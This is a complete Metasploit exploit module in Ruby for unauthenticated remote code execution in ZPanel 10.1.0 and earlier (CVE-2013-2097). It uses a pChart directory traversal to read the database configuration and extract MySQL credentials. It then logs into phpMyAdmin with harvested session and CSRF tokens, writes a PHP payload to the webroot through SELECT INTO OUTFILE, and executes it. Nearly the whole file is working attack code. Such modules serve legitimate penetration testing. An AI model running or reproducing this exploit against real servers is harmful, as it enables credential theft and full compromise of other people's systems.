require &#039;msf/core/exploit/php_exe&#039;
require &#039;nokogiri&#039;
require &#039;uri&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::PhpEXE
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Zpanel Remote Unauthenticated RCE&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an information disclosure vulnerability
        found in Zpanel <= 10.1.0. The vulnerability is due to a
        vulnerable version of pChart allowing remote, unauthenticated,
        users to read arbitrary files found on the filesystem. This
        particular module utilizes this vulnerability to identify the
        username/password combination of the MySQL instance. With the
        credentials the attackers can login to PHPMyAdmin and execute
        SQL commands to drop a malicious payload on the filesystem and
        call it leading to remote code execution.
      },
      &#039;Author&#039; =>
        [
          &#039;dawn isabel&#039;,
          &#039;brad wolfe&#039;,
          &#039;brent morris&#039;,
          &#039;james fitts&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-2097&#039; ],
          [ &#039;EDB&#039;, &#039;31173&#039; ],    # pChart
          [ &#039;OSVDB&#039;, &#039;102595&#039; ], # pChart
          [ &#039;URL&#039;, &#039;http://bugs.zpanelcp.com/view.php?id=665&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2013/Jun/39&#039; ],
          [ &#039;URL&#039;, &#039;http://www.reddit.com/r/netsec/comments/1ee0eg/zpanel_support_team_calls_forum_user_fucken/&#039; ]
        ],
      &#039;Payload&#039; =>
        {
          &#039;BadChars&#039; => "\x00",
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; } ],
          [ &#039;Linux x86&#039;, { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039; } ]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 30 2014&#039;))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Zpanel&#039;, &#039;/zpanel&#039;])
      ], self.class)
  end
 
  def get_setting(res, setting_name)
    n = ::Nokogiri::HTML(res.body)
    spans = n.search(&#039;//code//span//span&#039;)
    found_element = spans.select{ |e| /#{setting_name}/ === e.text }.first
    val = found_element.next.next.text
    val.scan(/[&#039;"]([[:print:]]+)[&#039;"]/).flatten.first || &#039;&#039;
  end
 
  def get_user(res)
    get_setting(res, &#039;user&#039;)
  end
 
  def get_passwd(res)
    get_setting(res, &#039;pass&#039;)
  end
 
  def get_dbname(res)
    get_setting(res, &#039;dbname&#039;)
  end
 
  def dot_dot_slash(uri)
    res = send_request_cgi({
      &#039;method&#039; =>&#039;GET&#039;,
      &#039;uri&#039; => normalize_uri("#{uri}", &#039;etc&#039;, &#039;lib&#039;, &#039;pChart2&#039;, &#039;examples&#039;, &#039;index.php&#039;),
      &#039;vars_get&#039; => {
        &#039;Action&#039; => &#039;View&#039;,
        &#039;Script&#039; => &#039;../../../../cnf/db.php&#039;
      }
    })
 
    uname  = get_user(res)
    passwd = get_passwd(res)
    dbname = get_dbname(res)
 
    return uname, passwd, dbname
  end
 
  def get_token_from_form(res)
    hidden_inputs = res.get_hidden_inputs
    hidden_inputs.first[&#039;token&#039;]
  end
 
  def get_token_from_url(url)
    u = URI(url)
    u.query.split(&#039;&&#039;).each do |param|
      param_name, param_value = param.scan(/([[:print:]]+)=([[:print:]]+)/).flatten
      return param_value if param_name == &#039;token&#039;
    end
 
    &#039;&#039;
  end
 
  def grab_sess_and_token(uri)
    print_status(&#039;Attempting to get PHPSESSIONID&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri("#{uri}"),
    })
 
    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out while attempting to get PHPSESSID&#039;)
    end
 
    cookies = res.get_cookies
    sid = cookies.scan(/(PHPSESSID=\w+);*/).flatten[0] || &#039;&#039;
 
    if sid.length > 0
      print_good(&#039;PHPSESSID identified!&#039;)
      print_good("PHPSESSID = #{sid.split("=")[1]}")
 
      print_status(&#039;Attempting to get CSRF token&#039;)
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri("#{uri}", &#039;etc&#039;, &#039;apps&#039;, &#039;phpmyadmin&#039;, &#039;index.php&#039;),
        &#039;Cookie&#039; => "#{sid}"
      })
 
      unless res
        fail_with(Failure::Unknown, &#039;Connection timed out while attempting to get CSRF token&#039;)
      end
 
      token = get_token_from_form(res)
      cookies = res.get_cookies
 
      cookies = cookies.split(&#039;; &#039;)
      cookies = "#{cookies[-1]} #{cookies[1]}; #{cookies[2]}; #{cookies[3]}; #{sid}"
 
      if token.length > 0
        print_good(&#039;CSRF token identified!&#039;)
        print_good("CSRF token = #{token}")
        return cookies, token, sid
      else
        print_error(&#039;CSRF token could not be identified...&#039;)
      end
    else
      print_error(&#039;PHPSESSID could not be identified...&#039;)
    end
  end
 
  def login_phpmyadmin(uri, uname, passwd, cookies, token, sess_id)
    old_cookies = cookies
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(&#039;etc&#039;, &#039;apps&#039;, &#039;phpmyadmin&#039;, &#039;index.php&#039;),
      &#039;cookie&#039; => cookies,
      &#039;ctype&#039;  => &#039;application/x-www-form-urlencoded&#039;,
      &#039;headers&#039;=>
        {
          &#039;Referer&#039; => "http://#{datastore[&#039;RHOST&#039;]}/etc/apps/phpmyadmin/",
        },
      &#039;vars_post&#039; => {
        &#039;pma_username&#039;         => uname,
        &#039;pma_password&#039;         => passwd,
        &#039;server&#039;               => &#039;1&#039;,
        &#039;lang&#039;                 => &#039;en&#039;,
        &#039;collation_connection&#039; => &#039;utf8_general_ci&#039;,
        &#039;token&#039;                => token
      }
    })
 
    cookies = "#{res.get_cookies}"
 
    old_cookies = old_cookies.split("; ")
    cookies = cookies.split("; ")
 
    new_cookies =  "#{old_cookies[0]}; "
    new_cookies << "#{old_cookies[1]}; "
    new_cookies << "#{old_cookies[2]}; "
    new_cookies << "#{old_cookies[3]}; "
    new_cookies << "#{cookies[0]}; "
    new_cookies << "#{cookies[1]} "
    new_cookies << "#{sess_id}"
 
    token = get_token_from_url(res[&#039;Location&#039;])
 
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(&#039;etc&#039;, &#039;apps&#039;, &#039;phpmyadmin&#039;, &#039;index.php&#039;),
      &#039;Referer&#039;  => "http://#{datastore[&#039;RHOST&#039;]}/etc/apps/phpmyadmin/",
      &#039;cookie&#039;   => new_cookies,
      &#039;vars_get&#039; => {
        &#039;token&#039; => token
      }
    })
 
    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out while attempting to login to phpMyAdmin&#039;)
    end
 
    if res.code == 200 and res.body.to_s =~ /phpMyAdmin is more friendly with a/
      print_good(&#039;PHPMyAdmin login successful!&#039;)
      return new_cookies, token
    end
  end
 
  def do_sql(cookies, token, uri)
    fname = "#{rand_text_alpha_upper(5)}.php"
    sql_stmt = "SELECT \"<?php #{payload.encoded} ?>\" INTO OUTFILE \"/etc/zpanel/panel/#{fname}\""
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(&#039;etc&#039;, &#039;apps&#039;, &#039;phpmyadmin&#039;, &#039;import.php&#039;),
      &#039;cookie&#039; => cookies,
      &#039;ctype&#039;  =>&#039;application/x-www-form-urlencoded; charset=UTF-8&#039;,
      &#039;headers&#039; => {
        &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;,
        &#039;Referer&#039; => "http://#{datastore[&#039;RHOST&#039;]}/etc/apps/phpmyadmin/server_sql.php?token=#{token}"
      },
      &#039;vars_post&#039; => {
        &#039;is_js_confirmed&#039; => &#039;0&#039;,
        &#039;token&#039;           => token,
        &#039;pos&#039;             => &#039;0&#039;,
        &#039;goto&#039;            => &#039;server_sql.php&#039;,
        &#039;message_to_show&#039; => &#039;Your+SQL+query+has+been+executed+successfully&#039;,
        &#039;sql_query&#039;       => sql_stmt,
        &#039;sql_delimiter&#039;   => &#039;;&#039;,
        &#039;show_query&#039;      => &#039;1&#039;,
        &#039;ajax_request&#039;    => &#039;true&#039;,
        &#039;_nocache&#039;        => rand.to_s[2..19].to_i
      }
    })
 
    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out when attempting to upload payload&#039;)
    end
 
    if res.body =~ /"success":true/
      print_good("&#039;#{fname}&#039; successfully uploaded")
      print_good("A privilege escalation exploit can be found &#039;exploits/linux/local/zpanel_zsudo&#039;")
      print_status("Executing &#039;#{fname}&#039; on the remote host")
 
      res = send_request_cgi({
        &#039;method&#039;=>&#039;GET&#039;,
        &#039;uri&#039;=>normalize_uri("#{uri}", "#{fname}")
      })
    else
      print_error("#{res.body.to_s}")
    end
  end
 
  def exploit
    # Checking pChart
    res = send_request_cgi({
      &#039;method&#039;=> &#039;GET&#039;,
      &#039;uri&#039;=> normalize_uri("#{datastore[&#039;URI&#039;]}", &#039;etc&#039;, &#039;lib&#039;, &#039;pChart2&#039;, &#039;examples&#039;, &#039;index.php&#039;)
    })
 
    # if pChart is vuln version
    if res.body =~ /pChart 2\.x/
      uname, passwd, db_name = dot_dot_slash("#{datastore[&#039;URI&#039;]}")
      if uname.length > 0 && passwd.length > 0
        print_good(&#039;Directory traversal successful, Username/Password identified!&#039;)
        print_good("Username: #{uname}")
        print_good("Password: #{passwd}")
        print_good("DB Name: #{db_name}")
        cookies, token, sess_id = grab_sess_and_token("#{datastore[&#039;URI&#039;]}")
        print_status(&#039;Logging into PHPMyAdmin now&#039;)
        cookies, token = login_phpmyadmin("#{datastore[&#039;URI&#039;]}", uname, passwd, cookies, token, sess_id)
        print_status(&#039;Uploading malicious payload now&#039;)
        do_sql(cookies, token, "#{datastore[&#039;URI&#039;]}")
      else
        print_error(&#039;It appears that the directory traversal was unsuccessful...&#039;)
      end
    else
      print_error("It appears that the version of pChart is not vulnerable...")
    end
  end
end

